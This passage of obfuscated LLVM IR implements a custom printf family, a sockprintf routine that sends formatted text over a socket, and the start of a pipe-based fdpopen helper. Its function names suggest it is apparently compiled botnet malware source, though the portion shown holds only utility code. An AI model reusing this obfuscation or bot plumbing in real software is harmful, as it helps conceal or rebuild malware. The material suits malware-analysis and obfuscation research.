  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 0, %128
  %131 = sub i32 %129, %130
  %132 = add nsw i32 %129, %128
  store i32 %131, i32* %9, align 4
  br label %331

; <label>:133:                                    ; preds = %88
  %134 = load i8*, i8** %5, align 8
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  br i1 %137, label %138, label %167

; <label>:138:                                    ; preds = %133
  %139 = load i8**, i8*** %4, align 8
  %140 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = icmp ule i32 %142, 40
  br i1 %143, label %144, label %152

; <label>:144:                                    ; preds = %138
  %145 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 3
  %146 = load i8*, i8** %145, align 8
  %147 = getelementptr i8, i8* %146, i32 %142
  %148 = bitcast i8* %147 to i32*
  %149 = sub i32 0, 8
  %150 = sub i32 %142, %149
  %151 = add i32 %142, 8
  store i32 %150, i32* %141, align 8
  br label %157

; <label>:152:                                    ; preds = %138
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %140, i32 0, i32 2
  %154 = load i8*, i8** %153, align 8
  %155 = bitcast i8* %154 to i32*
  %156 = getelementptr i8, i8* %154, i32 8
  store i8* %156, i8** %153, align 8
  br label %157

; <label>:157:                                    ; preds = %152, %144
  %158 = phi i32* [ %148, %144 ], [ %155, %152 ]
  %159 = load i32, i32* %158, align 4
  %160 = load i32, i32* %7, align 4
  %161 = load i32, i32* %8, align 4
  %162 = call i32 @printi(i8** %139, i32 %159, i32 10, i32 1, i32 %160, i32 %161, i32 97)
  %163 = load i32, i32* %9, align 4
  %164 = sub i32 0, %162
  %165 = sub i32 %163, %164
  %166 = add nsw i32 %163, %162
  store i32 %165, i32* %9, align 4
  br label %331

; <label>:167:                                    ; preds = %133
  %168 = load i8*, i8** %5, align 8
  %169 = load i8, i8* %168, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 120
  br i1 %171, label %172, label %202

; <label>:172:                                    ; preds = %167
  %173 = load i8**, i8*** %4, align 8
  %174 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %175 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = icmp ule i32 %176, 40
  br i1 %177, label %178, label %186

; <label>:178:                                    ; preds = %172
  %179 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 3
  %180 = load i8*, i8** %179, align 8
  %181 = getelementptr i8, i8* %180, i32 %176
  %182 = bitcast i8* %181 to i32*
  %183 = sub i32 0, 8
  %184 = sub i32 %176, %183
  %185 = add i32 %176, 8
  store i32 %184, i32* %175, align 8
  br label %191

; <label>:186:                                    ; preds = %172
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 2
  %188 = load i8*, i8** %187, align 8
  %189 = bitcast i8* %188 to i32*
  %190 = getelementptr i8, i8* %188, i32 8
  store i8* %190, i8** %187, align 8
  br label %191

; <label>:191:                                    ; preds = %186, %178
  %192 = phi i32* [ %182, %178 ], [ %189, %186 ]
  %193 = load i32, i32* %192, align 4
  %194 = load i32, i32* %7, align 4
  %195 = load i32, i32* %8, align 4
  %196 = call i32 @printi(i8** %173, i32 %193, i32 16, i32 0, i32 %194, i32 %195, i32 97)
  %197 = load i32, i32* %9, align 4
  %198 = sub i32 %197, -1694913417
  %199 = add i32 %198, %196
  %200 = add i32 %199, -1694913417
  %201 = add nsw i32 %197, %196
  store i32 %200, i32* %9, align 4
  br label %331

; <label>:202:                                    ; preds = %167
  %203 = load i8*, i8** %5, align 8
  %204 = load i8, i8* %203, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 88
  br i1 %206, label %207, label %240

; <label>:207:                                    ; preds = %202
  %208 = load i8**, i8*** %4, align 8
  %209 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %210 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = icmp ule i32 %211, 40
  br i1 %212, label %213, label %223

; <label>:213:                                    ; preds = %207
  %214 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %209, i32 0, i32 3
  %215 = load i8*, i8** %214, align 8
  %216 = getelementptr i8, i8* %215, i32 %211
  %217 = bitcast i8* %216 to i32*
  %218 = sub i32 0, %211
  %219 = sub i32 0, 8
  %220 = add i32 %218, %219
  %221 = sub i32 0, %220
  %222 = add i32 %211, 8
  store i32 %221, i32* %210, align 8
  br label %228

; <label>:223:                                    ; preds = %207
  %224 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %209, i32 0, i32 2
  %225 = load i8*, i8** %224, align 8
  %226 = bitcast i8* %225 to i32*
  %227 = getelementptr i8, i8* %225, i32 8
  store i8* %227, i8** %224, align 8
  br label %228

; <label>:228:                                    ; preds = %223, %213
  %229 = phi i32* [ %217, %213 ], [ %226, %223 ]
  %230 = load i32, i32* %229, align 4
  %231 = load i32, i32* %7, align 4
  %232 = load i32, i32* %8, align 4
  %233 = call i32 @printi(i8** %208, i32 %230, i32 16, i32 0, i32 %231, i32 %232, i32 65)
  %234 = load i32, i32* %9, align 4
  %235 = sub i32 0, %234
  %236 = sub i32 0, %233
  %237 = add i32 %235, %236
  %238 = sub i32 0, %237
  %239 = add nsw i32 %234, %233
  store i32 %238, i32* %9, align 4
  br label %331

; <label>:240:                                    ; preds = %202
  %241 = load i8*, i8** %5, align 8
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 117
  br i1 %244, label %245, label %277

; <label>:245:                                    ; preds = %240
  %246 = load i8**, i8*** %4, align 8
  %247 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %248 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = icmp ule i32 %249, 40
  br i1 %250, label %251, label %261

; <label>:251:                                    ; preds = %245
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 3
  %253 = load i8*, i8** %252, align 8
  %254 = getelementptr i8, i8* %253, i32 %249
  %255 = bitcast i8* %254 to i32*
  %256 = sub i32 0, %249
  %257 = sub i32 0, 8
  %258 = add i32 %256, %257
  %259 = sub i32 0, %258
  %260 = add i32 %249, 8
  store i32 %259, i32* %248, align 8
  br label %266

; <label>:261:                                    ; preds = %245
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 2
  %263 = load i8*, i8** %262, align 8
  %264 = bitcast i8* %263 to i32*
  %265 = getelementptr i8, i8* %263, i32 8
  store i8* %265, i8** %262, align 8
  br label %266

; <label>:266:                                    ; preds = %261, %251
  %267 = phi i32* [ %255, %251 ], [ %264, %261 ]
  %268 = load i32, i32* %267, align 4
  %269 = load i32, i32* %7, align 4
  %270 = load i32, i32* %8, align 4
  %271 = call i32 @printi(i8** %246, i32 %268, i32 10, i32 0, i32 %269, i32 %270, i32 97)
  %272 = load i32, i32* %9, align 4
  %273 = add i32 %272, -1417443737
  %274 = add i32 %273, %271
  %275 = sub i32 %274, -1417443737
  %276 = add nsw i32 %272, %271
  store i32 %275, i32* %9, align 4
  br label %331

; <label>:277:                                    ; preds = %240
  %278 = load i8*, i8** %5, align 8
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 99
  br i1 %281, label %282, label %317

; <label>:282:                                    ; preds = %277
  %283 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %284 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 8
  %286 = icmp ule i32 %285, 40
  br i1 %286, label %287, label %296

; <label>:287:                                    ; preds = %282
  %288 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 3
  %289 = load i8*, i8** %288, align 8
  %290 = getelementptr i8, i8* %289, i32 %285
  %291 = bitcast i8* %290 to i32*
  %292 = add i32 %285, -2056574303
  %293 = add i32 %292, 8
  %294 = sub i32 %293, -2056574303
  %295 = add i32 %285, 8
  store i32 %294, i32* %284, align 8
  br label %301

; <label>:296:                                    ; preds = %282
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %287
  %302 = phi i32* [ %291, %287 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = trunc i32 %303 to i8
  %305 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %304, i8* %305, align 1
  %306 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %306, align 1
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %309 = load i32, i32* %7, align 4
  %310 = load i32, i32* %8, align 4
  %311 = call i32 @prints(i8** %307, i8* %308, i32 %309, i32 %310)
  %312 = load i32, i32* %9, align 4
  %313 = sub i32 %312, 140273593
  %314 = add i32 %313, %311
  %315 = add i32 %314, 140273593
  %316 = add nsw i32 %312, %311
  store i32 %315, i32* %9, align 4
  br label %331

; <label>:317:                                    ; preds = %277
  br label %330

; <label>:318:                                    ; preds = %17
  br label %319

; <label>:319:                                    ; preds = %318, %35
  %320 = load i8**, i8*** %4, align 8
  %321 = load i8*, i8** %5, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  call void @printchar(i8** %320, i32 %323)
  %324 = load i32, i32* %9, align 4
  %325 = sub i32 0, %324
  %326 = sub i32 0, 1
  %327 = add i32 %325, %326
  %328 = sub i32 0, %327
  %329 = add nsw i32 %324, 1
  store i32 %328, i32* %9, align 4
  br label %330

; <label>:330:                                    ; preds = %319, %317
  br label %331

; <label>:331:                                    ; preds = %330, %301, %266, %228, %191, %157, %124
  %332 = load i8*, i8** %5, align 8
  %333 = getelementptr inbounds i8, i8* %332, i32 1
  store i8* %333, i8** %5, align 8
  br label %12

; <label>:334:                                    ; preds = %29, %12
  %335 = load i8**, i8*** %4, align 8
  %336 = icmp ne i8** %335, null
  br i1 %336, label %337, label %340

; <label>:337:                                    ; preds = %334
  %338 = load i8**, i8*** %4, align 8
  %339 = load i8*, i8** %338, align 8
  store i8 0, i8* %339, align 1
  br label %340

; <label>:340:                                    ; preds = %337, %334
  %341 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %342 = bitcast %struct.__va_list_tag* %341 to i8*
  call void @llvm.va_end(i8* %342)
  %343 = load i32, i32* %9, align 4
  ret i32 %343
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %50

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %26, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %29

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %11, align 4
  br label %26

; <label>:26:                                     ; preds = %21
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  br label %17

; <label>:29:                                     ; preds = %17
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %29
  store i32 0, i32* %7, align 4
  br label %41

; <label>:34:                                     ; preds = %29
  %35 = load i32, i32* %11, align 4
  %36 = load i32, i32* %7, align 4
  %37 = sub i32 %36, -1594564674
  %38 = sub i32 %37, %35
  %39 = add i32 %38, -1594564674
  %40 = sub nsw i32 %36, %35
  store i32 %39, i32* %7, align 4
  br label %41

; <label>:41:                                     ; preds = %34, %33
  %42 = load i32, i32* %8, align 4
  %43 = xor i32 2, -1
  %44 = xor i32 %42, %43
  %45 = and i32 %44, %42
  %46 = and i32 %42, 2
  %47 = icmp ne i32 %45, 0
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %41
  store i32 48, i32* %10, align 4
  br label %49

; <label>:49:                                     ; preds = %48, %41
  br label %50

; <label>:50:                                     ; preds = %49, %4
  %51 = load i32, i32* %8, align 4
  %52 = xor i32 1, -1
  %53 = xor i32 %51, %52
  %54 = and i32 %53, %51
  %55 = and i32 %51, 1
  %56 = icmp ne i32 %54, 0
  br i1 %56, label %76, label %57

; <label>:57:                                     ; preds = %50
  br label %58

; <label>:58:                                     ; preds = %69, %57
  %59 = load i32, i32* %7, align 4
  %60 = icmp sgt i32 %59, 0
  br i1 %60, label %61, label %75

; <label>:61:                                     ; preds = %58
  %62 = load i8**, i8*** %5, align 8
  %63 = load i32, i32* %10, align 4
  call void @printchar(i8** %62, i32 %63)
  %64 = load i32, i32* %9, align 4
  %65 = sub i32 %64, -452822002
  %66 = add i32 %65, 1
  %67 = add i32 %66, -452822002
  %68 = add nsw i32 %64, 1
  store i32 %67, i32* %9, align 4
  br label %69

; <label>:69:                                     ; preds = %61
  %70 = load i32, i32* %7, align 4
  %71 = add i32 %70, 982017673
  %72 = add i32 %71, -1
  %73 = sub i32 %72, 982017673
  %74 = add nsw i32 %70, -1
  store i32 %73, i32* %7, align 4
  br label %58

; <label>:75:                                     ; preds = %58
  br label %76

; <label>:76:                                     ; preds = %75, %50
  br label %77

; <label>:77:                                     ; preds = %92, %76
  %78 = load i8*, i8** %6, align 8
  %79 = load i8, i8* %78, align 1
  %80 = icmp ne i8 %79, 0
  br i1 %80, label %81, label %95

; <label>:81:                                     ; preds = %77
  %82 = load i8**, i8*** %5, align 8
  %83 = load i8*, i8** %6, align 8
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  call void @printchar(i8** %82, i32 %85)
  %86 = load i32, i32* %9, align 4
  %87 = sub i32 0, %86
  %88 = sub i32 0, 1
  %89 = add i32 %87, %88
  %90 = sub i32 0, %89
  %91 = add nsw i32 %86, 1
  store i32 %90, i32* %9, align 4
  br label %92

; <label>:92:                                     ; preds = %81
  %93 = load i8*, i8** %6, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %6, align 8
  br label %77

; <label>:95:                                     ; preds = %77
  br label %96

; <label>:96:                                     ; preds = %107, %95
  %97 = load i32, i32* %7, align 4
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %113

; <label>:99:                                     ; preds = %96
  %100 = load i8**, i8*** %5, align 8
  %101 = load i32, i32* %10, align 4
  call void @printchar(i8** %100, i32 %101)
  %102 = load i32, i32* %9, align 4
  %103 = add i32 %102, 1816826341
  %104 = add i32 %103, 1
  %105 = sub i32 %104, 1816826341
  %106 = add nsw i32 %102, 1
  store i32 %105, i32* %9, align 4
  br label %107

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* %7, align 4
  %109 = sub i32 %108, -1992465376
  %110 = add i32 %109, -1
  %111 = add i32 %110, -1992465376
  %112 = add nsw i32 %108, -1
  store i32 %111, i32* %7, align 4
  br label %96

; <label>:113:                                    ; preds = %96
  %114 = load i32, i32* %9, align 4
  ret i32 %114
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %128

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %75, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %87

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %75

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 0, 48
  %64 = add i32 %62, %63
  %65 = sub nsw i32 %62, 48
  %66 = sub i32 %64, 1741824182
  %67 = sub i32 %66, 10
  %68 = add i32 %67, 1741824182
  %69 = sub nsw i32 %64, 10
  %70 = load i32, i32* %18, align 4
  %71 = sub i32 %70, 657339244
  %72 = add i32 %71, %68
  %73 = add i32 %72, 657339244
  %74 = add nsw i32 %70, %68
  store i32 %73, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %61, %55
  %76 = load i32, i32* %18, align 4
  %77 = sub i32 %76, -2078322849
  %78 = add i32 %77, 48
  %79 = add i32 %78, -2078322849
  %80 = add nsw i32 %76, 48
  %81 = trunc i32 %79 to i8
  %82 = load i8*, i8** %17, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 -1
  store i8* %83, i8** %17, align 8
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %11, align 4
  %85 = load i32, i32* %21, align 4
  %86 = udiv i32 %85, %84
  store i32 %86, i32* %21, align 4
  br label %52

; <label>:87:                                     ; preds = %52
  %88 = load i32, i32* %19, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %116

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %112

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %14, align 4
  %95 = xor i32 2, -1
  %96 = xor i32 %94, %95
  %97 = and i32 %96, %94
  %98 = and i32 %94, 2
  %99 = icmp ne i32 %97, 0
  br i1 %99, label %100, label %112

; <label>:100:                                    ; preds = %93
  %101 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %101, i32 45)
  %102 = load i32, i32* %20, align 4
  %103 = add i32 %102, 1441948277
  %104 = add i32 %103, 1
  %105 = sub i32 %104, 1441948277
  %106 = add nsw i32 %102, 1
  store i32 %105, i32* %20, align 4
  %107 = load i32, i32* %13, align 4
  %108 = add i32 %107, -789813771
  %109 = add i32 %108, -1
  %110 = sub i32 %109, -789813771
  %111 = add nsw i32 %107, -1
  store i32 %110, i32* %13, align 4
  br label %115

; <label>:112:                                    ; preds = %93, %90
  %113 = load i8*, i8** %17, align 8
  %114 = getelementptr inbounds i8, i8* %113, i32 -1
  store i8* %114, i8** %17, align 8
  store i8 45, i8* %114, align 1
  br label %115

; <label>:115:                                    ; preds = %112, %100
  br label %116

; <label>:116:                                    ; preds = %115, %87
  %117 = load i32, i32* %20, align 4
  %118 = load i8**, i8*** %9, align 8
  %119 = load i8*, i8** %17, align 8
  %120 = load i32, i32* %13, align 4
  %121 = load i32, i32* %14, align 4
  %122 = call i32 @prints(i8** %118, i8* %119, i32 %120, i32 %121)
  %123 = sub i32 0, %117
  %124 = sub i32 0, %122
  %125 = add i32 %123, %124
  %126 = sub i32 0, %125
  %127 = add nsw i32 %117, %122
  store i32 %126, i32* %8, align 4
  br label %128

; <label>:128:                                    ; preds = %116, %25
  %129 = load i32, i32* %8, align 4
  ret i32 %129
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.17, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
